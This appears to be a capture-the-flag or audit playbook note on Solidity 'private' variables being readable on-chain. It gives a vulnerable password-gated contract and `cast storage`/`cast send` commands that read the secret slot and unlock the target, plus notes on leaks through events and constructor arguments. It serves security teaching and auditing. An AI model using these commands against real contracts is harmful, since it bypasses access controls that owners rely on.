# Visibility / state-read — `private` is not secret

## The shape

```solidity
contract Locked {
    bytes32 private password;    // "hidden"
    function unlock(bytes32 _p) public { require(_p == password); locked = false; }
}
```

`private` hides a var from OTHER CONTRACTS — it does not hide it from the
world. Every storage slot is readable via `eth_getStorageAt`. The "secret" is
on a public ledger.

## The detection fingerprint

- a `private`/`internal` var the contract treats as a secret (a password, seed,
  key)
- a `require(input == privateVar)` gate
- **falsifier**: the secret is genuinely off-chain (a commit, an oracle) — rare

## The exploit

```bash
# read the private slot directly
cast storage $CHALLENGE 0 --rpc-url $RPC        # slot 0
cast storage $CHALLENGE 1 --rpc-url $RPC        # slot 1
# feed the leaked value to the gate
cast send $CHALLENGE "unlock(bytes32)" 0x<pw> --private-key $KEY --rpc-url $RPC
```

## The slot-order read

```
slot 0: first declared var (or a packed group)
slot N: the Nth; mappings/arrays are hashed — see storage-collision.md
a bytes32 password at slot 1 → cast storage $CH 1 returns it verbatim
```

For a `string`/`bytes` longer than 31 bytes the data is at `keccak256(slot)`;
`cast storage $CH $(cast keccak <slot-hex>)` reads it.

## The event/log leak

A secret emitted in an `event`/`log` is on-chain forever:
`cast logs` / the receipt's `logs` decode it. A constructor argument is in the
deploy tx's input — `cast tx <deploy-hash>` shows it.

## The paired classes

- a `private` password → feeds an `access-control`-style unlock
- a `private` seed → feeds `weak-randomness` (predict the "random")
- constructor args → a leaked key/owner in the deploy tx

## The evidence

`cast call $CH "locked()(bool)"` → false after the leaked-value unlock. The
`cast storage` read + the unlock tx + the `locked()` flip are the chain.
